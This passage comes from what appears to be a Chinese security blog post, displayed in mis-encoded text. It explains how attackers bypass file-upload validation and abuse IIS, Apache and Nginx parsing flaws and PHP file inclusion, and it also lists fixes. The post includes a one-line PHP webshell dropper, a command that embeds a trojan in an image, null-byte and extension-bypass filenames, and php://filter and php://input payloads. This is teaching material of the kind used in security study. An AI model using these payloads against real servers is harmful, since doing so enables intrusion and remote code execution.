ï¼ˆ2ï¼‰æ­£åˆ™ä¸¥æ ¼åˆ¤æ–­ç”¨æˆ·è¾“å…¥å‚æ•°çš„æ ¼å¼ ï¼ˆ3ï¼‰php.inié…ç½®open_basediré™å®šæ–‡ä»¶è®¿é—®èŒƒå›´ æ–‡ä»¶ä¸Šä¼ æµç¨‹ ä¸€ã€å®¢æˆ·ç«¯æ£€æµ‹ç»•è¿‡(javascript æ£€æµ‹)â€‹ é¦–å…ˆè§‚å¯Ÿåˆ°æç¤ºåªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶ï¼Œé‚£ä¹ˆå‰ç«¯çš„æŸ¥çœ‹ä»£ç ï¼Œå½“é¡µé¢å‘ç”Ÿæ”¹å˜æ—¶ï¼Œä¼šè°ƒç”¨è¿™ä¸ªcheckFileExtå‡½æ•°æ¥æ£€æŸ¥ä¸Šä¼ çš„æ˜¯ä¸æ˜¯å›¾ç‰‡ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å‰ç«¯å°†checkFileExtå‡½æ•°åˆ é™¤ï¼Œå°±èƒ½ä¸Šä¼ ä¸€ä¸ªä¸€ä¸ªéå›¾ç‰‡æ–‡ä»¶ã€‚ æ–‡ä»¶ä¸Šä¼ å®¢æˆ·ç«¯ï¼š å°†checkFileExt(this.value)å‡½æ•°åˆ é™¤ä¾¿å¯ä¸Šä¼ ä»»æ„æ–‡ä»¶ æˆ–è€…é€šè¿‡burpæŠ“åŒ…å°†ä¹‹å‰æ”¹ä¸ºç¬¦åˆç±»å‹çš„æ–‡ä»¶åœ¨æ”¹å›æ¥ äºŒã€æœåŠ¡ç«¯éªŒè¯ç»•è¿‡(MIME ç±»å‹æ£€æµ‹)â€‹ MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚ â€‹ æ¯ä¸ªMIMEç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰é¢æ˜¯æ•°æ®çš„å¤§ç±»åˆ«ï¼Œä¾‹å¦‚å£°éŸ³audioã€å›¾è±¡imageç­‰ï¼Œåé¢å®šä¹‰å…·ä½“çš„ç§ç±»ã€‚ å¸¸è§çš„MIMEç±»å‹(é€šç”¨å‹)ï¼š è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ .html text/html xmlæ–‡æ¡£ .xml text/xml XHTMLæ–‡æ¡£ .xhtml application/xhtml+xml æ™®é€šæ–‡æœ¬ .txt text/plain RTFæ–‡æœ¬ .rtf application/rtf PDFæ–‡æ¡£ .pdf application/pdf Microsoft Wordæ–‡ä»¶ .word application/msword PNGå›¾åƒ .png image/png GIFå›¾å½¢ .gif image/gif JPEGå›¾å½¢ .jpeg,.jpg image/jpeg auå£°éŸ³æ–‡ä»¶ .au audio/basic MIDIéŸ³ä¹æ–‡ä»¶ mid,.midi audio/midi,audio/x-midi RealAudioéŸ³ä¹æ–‡ä»¶ .ra, .ram audio/x-pn-realaudio MPEGæ–‡ä»¶ .mpg,.mpeg video/mpeg AVIæ–‡ä»¶ .avi video/x-msvideo GZIPæ–‡ä»¶ .gz application/x-gzip TARæ–‡ä»¶ .tar application/x-tar ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ® application/octet-stream é€šè¿‡ä½¿ç”¨ PHP çš„å…¨å±€æ•°ç»„ $_FILESï¼Œä½ å¯ä»¥ä»å®¢æˆ·è®¡ç®—æœºå‘è¿œç¨‹æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶ã€‚ ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¡¨å•çš„ input nameï¼Œç¬¬äºŒä¸ªä¸‹æ ‡å¯ä»¥æ˜¯ â€œnameâ€, â€œtypeâ€, â€œsizeâ€, â€œtmp_nameâ€ æˆ– â€œerrorâ€ã€‚å°±åƒè¿™æ ·ï¼š $_FILES[&quot;file&quot;][&quot;name&quot;] è¢«ä¸Šä¼ æ–‡ä»¶çš„åç§° $_FILES[&quot;file&quot;][&quot;type&quot;] è¢«ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ $_FILES[&quot;file&quot;][&quot;size&quot;] è¢«ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚è®¡ $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§° $_FILES[&quot;file&quot;][&quot;error&quot;] ç”±æ–‡ä»¶ä¸Šä¼ å¯¼è‡´çš„é”™è¯¯ä»£ç  è¯¦ç»†å¯å‚è€ƒï¼šhttp://www.w3school.com.cn/php/php_file_upload.asp â€‹ åˆ†æä»£ç é€»è¾‘ï¼šé¦–å…ˆä¼šè·å–åˆ°å‰ç«¯çš„æäº¤è¯·æ±‚ï¼Œç„¶åå®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ï¼ˆå®šä¹‰å›¾ç‰‡ä¸Šä¼ æŒ‡å®šç±»å‹ï¼‰ï¼Œç„¶åé€šè¿‡upload_sickå‡½æ•°å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸€å®šçš„æ£€æŸ¥ã€‚ åˆ†æupload_sickå‡½æ•°ï¼ˆå®šä¹‰åœ¨uploadfunction.phpæ–‡ä»¶é‡Œé¢ï¼‰å­˜åœ¨æ¼æ´çš„çš„åŸå› æ˜¯å› ä¸º $ _FILES() è¿™ä¸ªå…¨å±€çš„æ–¹æ³•æ˜¯é€šè¿‡æµè§ˆå™¨httpå¤´å»è·å–çš„content-typeï¼Œcontent-typeæ˜¯å‰ç«¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ã€‚å®¹æ˜“è¢«ç»•è¿‡ã€‚ â€‹ ä¸Šä¼ ä¸€å¼ æ­£å¸¸çš„ç¬¦åˆæ ‡å‡†çš„å›¾ç‰‡ï¼Œå¯¹å…¶content-typeè¿›è¡ŒæŠ“åŒ…æ“ä½œã€‚å¯è§æ­£å¸¸ä¸Šä¼ ç¬¦åˆè¦æ±‚çš„å›¾ç‰‡ä¸­æ•°æ®åŒ…ä¸­content-typeä¸ºimage/pngå¯¹æ¯”ç¬¦åˆæ¡ä»¶ï¼Œè€Œphpæ–‡ä»¶åˆ™ä¸ç¬¦åˆæ¡ä»¶è¿”å›æ–‡ä»¶ç±»å‹é”™è¯¯ã€‚ ä¸‰ã€ä»£ç æ³¨å…¥ç»•è¿‡â€“getimagesize()â€‹ getimagesize() å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ï¼Œå¦‚æœç”¨è¿™ä¸ªæ¶µæ•°æ¥è·å–ç±»å‹ï¼Œä»è€Œåˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡çš„è¯ï¼Œä¼šå­˜åœ¨é—®é¢˜ã€‚ è¯­æ³•æ ¼å¼ï¼š array getimagesize ( string $filename [, array &amp;$imageinfo ] ) getimagesize() å‡½æ•°å°†æµ‹å®šä»»ä½• GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP å›¾åƒæ–‡ä»¶çš„å¤§å°å¹¶è¿”å›å›¾åƒçš„å°ºå¯¸ä»¥åŠæ–‡ä»¶ç±»å‹åŠå›¾ç‰‡é«˜åº¦ä¸å®½åº¦ã€‚ æ–‡ä»¶åŒ…å«æ¼æ´ä¹‹æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆ©ç”¨ æ–¹æ³•ä¸€ï¼šç›´æ¥ä¼ªé€ å¤´éƒ¨GIF89A æ–¹æ³•äºŒï¼šCMDæ–¹æ³•ï¼Œcopy /b test.png+1.php muma.png æ–¹æ³•ä¸‰ï¼šç›´æ¥ä½¿ç”¨å·¥å…·å¢åŠ å¤‡æ³¨å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚ å››ã€è·¯å¾„/æ‰©å±•åç»•è¿‡1ã€ç™½åå• 0x00æˆªæ–­æˆ–test.asp%00.jpg MIMEç»•è¿‡ 2ã€é»‘åå• ï¼ˆ1ï¼‰æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ ï¼ˆ2ï¼‰åå•ç»•è¿‡ â€‹ ç”¨é»‘åå•é‡Œæ²¡æœ‰çš„åå•è¿›è¡Œæ”»å‡»ï¼Œæ¯”å¦‚é»‘åå•é‡Œæ²¡æœ‰.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccessåç¼€æ–‡ä»¶ä¹‹ç±» ï¼ˆ3ï¼‰ç‰¹æ®Šæ–‡ä»¶åæˆ–æ–‡ä»¶å¤¹ç»•è¿‡(windows) â€‹ è¿˜æœ‰æ¯”å¦‚å‘é€çš„http åŒ…é‡ŒæŠŠæ–‡ä»¶åæ”¹æˆtest.asp. æˆ–test.asp_(ä¸‹åˆ’çº¿ä¸ºç©ºæ ¼)ï¼Œè¿™ç§å‘½åæ–¹å¼åœ¨windows ç³»ç»Ÿé‡Œæ˜¯ä¸è¢«å…è®¸çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨burp ä¹‹ç±»é‡Œè¿›è¡Œä¿®æ”¹ï¼Œç„¶åç»•è¿‡éªŒè¯åï¼Œä¼šè¢«windows ç³»ç»Ÿè‡ªåŠ¨å»æ‰åé¢çš„ç‚¹å’Œç©ºæ ¼ï¼Œä½†è¦æ³¨æ„Unix/Linux ç³»ç»Ÿæ²¡æœ‰è¿™ä¸ªç‰¹æ€§ã€‚ ï¼ˆ4ï¼‰0x00æˆªæ–­%00å’Œ0x0a name = getname(http request) //å‡å¦‚è¿™æ—¶å€™è·å–åˆ°çš„æ–‡ä»¶åæ˜¯test.asp .jpg(asp åé¢ä¸º0x00) type = gettype(name) //è€Œåœ¨gettype()å‡½æ•°é‡Œå¤„ç†æ–¹å¼æ˜¯ä»åå¾€å‰æ‰«ææ‰©å±•åï¼Œæ‰€ä»¥åˆ¤æ–­ä¸ºjpg if (type == jpg) SaveFileToPath(UploadPath.name, name) //ä½†åœ¨è¿™é‡Œå´æ˜¯ä»¥0x00 ä½œä¸ºæ–‡ä»¶åæˆªæ–­ â€‹ //æœ€åä»¥test.asp å­˜å…¥è·¯å¾„é‡Œ ï¼ˆ5ï¼‰æŠŠæ–‡ä»¶åæ”¹æˆtest.asp. æˆ–test.asp_(ä¸‹åˆ’çº¿ä¸ºç©ºæ ¼)ï¼Œè¿™ç§å‘½åæ–¹å¼åœ¨windows ç³»ç»Ÿé‡Œæ˜¯ä¸è¢«å…è®¸çš„ï¼Œæ‰€ä»¥éœ€è¦åœ¨burp ä¹‹ç±»é‡Œè¿›è¡Œä¿®æ”¹ï¼Œç„¶åç»•è¿‡éªŒè¯åï¼Œä¼šè¢«windows ç³»ç»Ÿè‡ªåŠ¨å»æ‰åé¢çš„ç‚¹å’Œç©ºæ ¼ï¼Œä½†è¦æ³¨æ„Unix/Linux ç³»ç»Ÿæ²¡æœ‰è¿™ä¸ªç‰¹æ€§ã€‚ ï¼ˆ6ï¼‰åŒåç¼€åç»•è¿‡ ï¼ˆ7ï¼‰::$DATAç»•è¿‡ â€‹ æ˜¯Windowsä¸‹NTFSæ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªç‰¹æ€§ï¼Œå³NTFSæ–‡ä»¶ç³»ç»Ÿçš„å­˜å‚¨æ•°æ®æµçš„ä¸€ä¸ªå±æ€§ DATA æ—¶ï¼Œå°±æ˜¯è¯·æ±‚ a.asp æœ¬èº«çš„æ•°æ®ï¼Œå¦‚æœa.asp è¿˜åŒ…å«äº†å…¶ä»–çš„æ•°æ®æµï¼Œæ¯”å¦‚ a.asp:lake2.aspï¼Œè¯·æ±‚ a.asp:lake2.asp::$DATAï¼Œåˆ™æ˜¯è¯·æ±‚a.aspä¸­çš„æµæ•°æ®lake2.aspçš„æµæ•°æ®å†…å®¹ã€‚ äº”ã€ä¸­é—´ä»¶è§£ææ¼æ´ç»•è¿‡æ€»ç»“å›¾ IISè§£ææ¼æ´ï¼ˆä¸€ï¼‰IIS5.x-6.xè§£ææ¼æ´ä½¿ç”¨iis5.x-6.xç‰ˆæœ¬çš„æœåŠ¡å™¨ï¼Œå¤§å¤šä¸ºwindows server 2003ï¼Œç½‘ç«™æ¯”è¾ƒå¤è€ï¼Œå¼€å‘è¯­å¥ä¸€èˆ¬ä¸ºaspï¼›è¯¥è§£ææ¼æ´ä¹Ÿåªèƒ½è§£æaspæ–‡ä»¶ï¼Œè€Œä¸èƒ½è§£æaspxæ–‡ä»¶ã€‚ ç›®å½•è§£æ(6.0) å½¢å¼ï¼šwww.xxx.com/xx.asp/xx.jpgåŸç†: æœåŠ¡å™¨é»˜è®¤ä¼šæŠŠ.aspï¼Œ.asaç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶ã€‚ æ–‡ä»¶è§£æ å½¢å¼ï¼šwww.xxx.com/xx.asp;.jpgåŸç†ï¼šæœåŠ¡å™¨é»˜è®¤ä¸è§£æ;å·åé¢çš„å†…å®¹ï¼Œå› æ­¤xx.asp;.jpgä¾¿è¢«è§£ææˆaspæ–‡ä»¶äº†ã€‚ è§£ææ–‡ä»¶ç±»å‹ IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§ : /test.asa/test.cer/test.cdx ä¿®å¤æ–¹æ¡ˆ 1.ç›®å‰å°šæ— å¾®è½¯å®˜æ–¹çš„è¡¥ä¸ï¼Œå¯ä»¥é€šè¿‡è‡ªå·±ç¼–å†™æ­£åˆ™ï¼Œé˜»æ­¢ä¸Šä¼ xx.asp;.jpgç±»å‹çš„æ–‡ä»¶åã€‚2.åšå¥½æƒé™è®¾ç½®ï¼Œé™åˆ¶ç”¨æˆ·åˆ›å»ºæ–‡ä»¶å¤¹ã€‚ ï¼ˆäºŒï¼‰IIS7.xè§£ææ¼æ´éœ€è¦æŠŠè¯·æ±‚é™åˆ¶çš„ å¯¹å‹¾ ç»™å»æ‰ï¼Œæ‰ä¼šæœ‰è§£ææ¼æ´192.168.0.106:8089/1.jpg/.php,è¿™æ ·å»æ„é€ ã€‚ Apacheè§£ææ¼æ´æ¼æ´åŸç† Apache è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚ test.php.owf.rar â€œ.owfâ€å’Œâ€.rarâ€ è¿™ä¸¤ç§åç¼€æ˜¯apacheä¸å¯è¯†åˆ«è§£æ,apacheå°±ä¼šæŠŠoldboy.php.owf.rarè§£ææˆphpã€‚ æ¼æ´å½¢å¼ www.xxxx.xxx.com/test.php.php123 å…¶ä½™é…ç½®é—®é¢˜å¯¼è‡´æ¼æ´ ï¼ˆ1ï¼‰å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddHandler php5-script .php è¿™æ—¶åªè¦æ–‡ä»¶åé‡ŒåŒ…å«.php å³ä½¿æ–‡ä»¶åæ˜¯ test2.php.jpg ä¹Ÿä¼šä»¥ php æ¥æ‰§è¡Œã€‚ï¼ˆ2ï¼‰å¦‚æœåœ¨ Apache çš„ conf é‡Œæœ‰è¿™æ ·ä¸€è¡Œé…ç½® AddType application/x-httpd-php .jpg å³ä½¿æ‰©å±•åæ˜¯ jpgï¼Œä¸€æ ·èƒ½ä»¥ php æ–¹å¼æ‰§è¡Œã€‚ ä¿®å¤æ–¹æ¡ˆ 1.apacheé…ç½®æ–‡ä»¶ï¼Œç¦æ­¢.php.è¿™æ ·çš„æ–‡ä»¶æ‰§è¡Œï¼Œé…ç½®æ–‡ä»¶é‡Œé¢åŠ å…¥ 1234&lt;Files ~ â€œ.(php.|php3.)â€&gt; Order Allow,Deny Deny from all&lt;&#x2F;Files&gt; 2.ç”¨ä¼ªé™æ€èƒ½è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œé‡å†™ç±»ä¼¼.php.*è¿™ç±»æ–‡ä»¶ï¼Œæ‰“å¼€apacheçš„httpd.confæ‰¾åˆ°LoadModule rewrite_module modules/mod_rewrite.soæŠŠ#å·å»æ‰ï¼Œé‡å¯apache,åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å»ºç«‹.htaccessæ–‡ä»¶ ä»£ç ï¼š 123456789101112131415&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteRule .(php.|php3.) &#x2F;index.phpRewriteRule .(pHp.|pHp3.) &#x2F;index.phpRewriteRule .(phP.|phP3.) &#x2F;index.phpRewriteRule .(Php.|Php3.) &#x2F;index.phpRewriteRule .(PHp.|PHp3.) &#x2F;index.phpRewriteRule .(PhP.|PhP3.) &#x2F;index.phpRewriteRule .(pHP.|pHP3.) &#x2F;index.phpRewriteRule .(PHP.|PHP3.) &#x2F;index.php&lt;&#x2F;IfModule&gt;.htaccess é…ç½®æ–‡ä»¶LoadModule rewrite_module modules&#x2F;mod_rewrite.soå‰çš„æ³¨é‡Šå»æ‰ï¼Œå¯»æ‰¾å…³é”®è¯ï¼šAllowOverrideï¼Œå¹¶æŠŠåé¢çš„å‚æ•°ä»Noneå…¨éƒ¨æ”¹æˆAll Nginxè§£ææ¼æ´æ¼æ´åŸç† Nginxé»˜è®¤æ˜¯ä»¥CGIçš„æ–¹å¼æ”¯æŒPHPè§£æçš„ï¼Œæ™®éçš„åšæ³•æ˜¯åœ¨Nginxé…ç½®æ–‡ä»¶ä¸­é€šè¿‡æ­£åˆ™åŒ¹é…è®¾ç½®SCRIPT_FILENAMEã€‚å½“è®¿é—®www.xx.com/phpinfo.jpg/1.phpè¿™ä¸ªURLæ—¶ï¼Œ$fastcgi_script_nameä¼šè¢«è®¾ç½®ä¸ºâ€œphpinfo.jpg/1.phpâ€ï¼Œç„¶åæ„é€ æˆSCRIPT_FILENAMEä¼ é€’ç»™PHP CGIï¼Œä½†æ˜¯PHPä¸ºä»€ä¹ˆä¼šæ¥å—è¿™æ ·çš„å‚æ•°ï¼Œå¹¶å°†phpinfo.jpgä½œä¸ºPHPæ–‡ä»¶è§£æå‘¢?è¿™å°±è¦è¯´åˆ°fix_pathinfoè¿™ä¸ªé€‰é¡¹äº†ã€‚ å¦‚æœå¼€å¯äº†è¿™ä¸ªé€‰é¡¹ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘åœ¨PHPä¸­çš„å¦‚ä¸‹é€»è¾‘ï¼š PHPä¼šè®¤ä¸ºSCRIPT_FILENAMEæ˜¯phpinfo.jpgï¼Œè€Œ1.phpæ˜¯PATH_INFOï¼Œæ‰€ä»¥å°±ä¼šå°†phpinfo.jpgä½œä¸ºPHPæ–‡ä»¶æ¥è§£æäº† æ¼æ´å½¢å¼ www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg%00.phpwww.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php xxx.jpg%00.php (Nginx &lt;8.03 ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´) å¦å¤–ä¸€ç§æ‰‹æ³•ï¼šä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºtest.jpgï¼Œä»¥ä¸‹å†…å®¹çš„æ–‡ä»¶ã€‚ &lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt; ç„¶åè®¿é—®test.jpg/.php,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬shell.phpã€‚ ä¿®å¤æ–¹æ¡ˆ 1.ä¿®æ”¹php.iniæ–‡ä»¶ï¼Œå°†cgi.fix_pathinfoçš„å€¼è®¾ç½®ä¸º0;2.åœ¨Nginxé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š 12345if ( $fastcgi_script_name ~ ..&#x2F;.php ) &#123;return 403;&#125; è¿™è¡Œä»£ç çš„æ„æ€æ˜¯å½“åŒ¹é…åˆ°ç±»ä¼¼test.jpg/a.phpçš„URLæ—¶ï¼Œå°†è¿”å›403é”™è¯¯ä»£ç ã€‚ .htaccessæ–‡ä»¶è§£æä¸Šä¼ .htaccessæ–‡ä»¶ ï¼Œæ˜¯å°†æœ¬æ–‡ä»¶å¤¹ä¸­çš„æ‰€æœ‰æ–‡ä»¶ç”¨phpæ¥æ‰§è¡Œ ä¹Ÿå¯ä»¥ç§°ä¸ºæ–‡ä»¶åŒ…å«æ¼æ´æ–‡ä»¶å†…å®¹ä¸ºï¼š &lt;FilesMatch â€œâ€&gt;SetHandler application/x-httpd-php æœ¬åœ°æ–‡ä»¶åŒ…å«è§£ææ–‡ä»¶åŒ…å«æ¼æ´çš„æŸ¥æ‰¾ï¼Œå½“æœ‰æºä»£ç çš„æ—¶å€™å¯ä»¥ç›´æ¥æŸ¥æ‰¾ï¼Œç›¸å…³å‡½æ•°ï¼Œå½“æ²¡æœ‰æºä»£ç çš„æ—¶å€™æˆ‘ä»¬å°±éœ€è¦æ‰‹å·¥åŒ…å«åˆ«çš„æ–‡ä»¶æ¥çœ‹çœ‹æ˜¯å¦æœ‰åŒ…å«æ¼æ´ã€‚ æ–‡ä»¶åŒ…å«æœ‰å››ä¸ªå‡½æ•°ï¼Œé‡åˆ°é”™è¯¯ä¸ä¼šåœæ­¢æ‰§è¡Œï¼šinclude()ã€include_once() é‡åˆ°é”™è¯¯ä¼šåœæ­¢æ‰§è¡Œï¼šrequire()ã€ruquire_once() æˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨include()å’Œinclude_once() éœ€è¦æˆ‘ä»¬æŠŠallow_url_include()è®¾ç½®ä¸ºonçŠ¶æ€ã€magic_quotes_gpcä¸ºoffçŠ¶æ€ ï¼ˆ1ï¼‰åŒ…å«æ¼æ´ä¸€èˆ¬é‡‡ç”¨å›¾ç‰‡ä¸æ–‡ä»¶ä¸€èµ·ä¸Šä¼ ï¼Œåˆ©ç”¨åŒ…å«æ¼æ´å°†å›¾ç‰‡ä¸­çš„ä¸€å¥è¯æœ¨é©¬ç»™è§£å‡ºæ¥ã€‚ï¼ˆ2ï¼‰éœ€è¦ä½¿ç”¨../æ¥è¿›è¡Œè¿”å›ä¸Šä¸€çº§ç›®å½•ï¼Œå¦‚æœè¢«è¿‡æ»¤å¯ä»¥è¿›è¡Œâ€¦/./è¿›è¡Œè¿‡æ»¤ã€‚ï¼ˆ3ï¼‰å¦‚æœæ²¡æœ‰å‘ç°éœ€è¦è¿›è¡Œä¸Šä¼ çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©é€‰æ‹©æ‰¾åˆ°æ—¥å¿—æ–‡ä»¶è¿›è¡ŒåŒ…å«è·å–webshellï¼Œ/apache/logs/access.logç›®å½•ï¼Œä½†æ˜¯ç›®å½•å‰é¢çš„../éœ€è¦è‡ªå·±æ„é€ ã€‚ï¼ˆ4ï¼‰æ–‡ä»¶åŒ…å«è¯»æ–‡ä»¶å’Œå†™æ–‡ä»¶ï¼Œè¿™ä¸ªéƒ½éœ€è¦ä½¿ç”¨phpåè®®è¯»æ–‡ä»¶ï¼šphp://filter/read=convert.base64-encode/resource= ï¼ˆä½¿ç”¨base64åŠ å¯†é˜²æ­¢æŠ¥é”™ï¼‰å†™æ–‡ä»¶ï¼šphp://input åœ¨postä¸­æäº¤ï¼ˆ5ï¼‰str_replace()å‡½æ•°ï¼Œå¯ä»¥å°†httpã€httpsã€../ã€..\\éƒ½æ›¿æ¢ä¸ºç©ºæˆ–åˆ é™¤ã€‚æˆ‘ä»¬éœ€è¦ä½¿ç”¨hthttp://tp://å’Œ..././è¿›è¡Œç»•è¿‡ï¼Œç»å¯¹è·¯å¾„ä¹Ÿå¯ä»¥ä¸ä¼šå—å½±å“ã€‚ï¼ˆ6ï¼‰fnmatch()å‡½æ•°ï¼Œåªå…è®¸includeå’Œfileå¤´è¿›è¡Œè®¿é—®æˆ‘ä»¬å¯ä»¥ä½¿ç”¨fileåè®®file://c:1.txt è¿™é‡Œç»å¯¹è·¯å¾„å’Œ../éƒ½æ”¯æŒã€‚ä¸€èˆ¬ä¼ä¸šéƒ½ä½¿ç”¨è¿™ä¸ªå‡½æ•°è¿›è¡Œè¿‡æ»¤ã€‚ å…­ã€å®‰å…¨é˜²èŒƒâ€‹ é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ç‰¹ç‚¹å’Œå¿…é¡»å…·å¤‡çš„ä¸‰ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬é˜»æ–­ä»»ä½•ä¸€ä¸ªæ¡ä»¶å°±å¯ä»¥è¾¾åˆ°ç»„ç»‡æ–‡ä»¶ä¸Šä¼ æ”»å‡»çš„ç›®çš„ï¼š 1ã€æœ€æœ‰æ•ˆçš„ï¼Œå°†æ–‡ä»¶ä¸Šä¼ ç›®å½•ç›´æ¥è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œï¼Œå¯¹äºLinuxè€Œè¨€ï¼Œæ’¤é”€å…¶ç›®å½•çš„â€™xâ€™æƒé™ï¼›å®é™…ä¸­å¾ˆå¤šå¤§å‹ç½‘ç«™çš„ä¸Šä¼ åº”ç”¨éƒ½ä¼šæ”¾ç½®åœ¨ç‹¬ç«‹çš„å­˜å‚¨ä¸Šä½œä¸ºé™æ€æ–‡ä»¶å¤„ç†ï¼Œä¸€æ˜¯æ–¹ä¾¿ä½¿ç”¨ç¼“å­˜åŠ é€Ÿé™ä½èƒ½è€—ï¼ŒäºŒæ˜¯æœç»äº†è„šæœ¬æ‰§è¡Œçš„å¯èƒ½æ€§ï¼› 2ã€æ–‡ä»¶ç±»å‹æ£€æŸ¥ï¼šå¼ºçƒˆæ¨èç™½åå•æ–¹å¼ï¼Œç»“åˆMIME Typeã€åç¼€æ£€æŸ¥ç­‰æ–¹å¼ï¼ˆå³åªå…è®¸å…è®¸çš„æ–‡ä»¶ç±»å‹è¿›è¡Œä¸Šä¼ ï¼‰ï¼›æ­¤å¤–å¯¹äºå›¾ç‰‡çš„å¤„ç†å¯ä»¥ä½¿ç”¨å‹ç¼©å‡½æ•°æˆ–resizeå‡½æ•°ï¼Œå¤„ç†å›¾ç‰‡çš„åŒæ—¶ç ´åå…¶åŒ…å«çš„HTMLä»£ç ï¼› 3ã€ä½¿ç”¨éšæœºæ•°æ”¹å†™æ–‡ä»¶åå’Œæ–‡ä»¶è·¯å¾„ï¼Œä½¿å¾—ç”¨æˆ·ä¸èƒ½è½»æ˜“è®¿é—®è‡ªå·±ä¸Šä¼ çš„æ–‡ä»¶ï¼› 4ã€å•ç‹¬è®¾ç½®æ–‡ä»¶æœåŠ¡å™¨çš„åŸŸåï¼›","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Metasploit","slug":"Metasploit","date":"2019-10-06T11:59:54.000Z","updated":"2020-09-20T09:02:12.477Z","comments":true,"path":"2019/10/06/Metasploit/","link":"","permalink":"https://zhangyanlady.github.io/2019/10/06/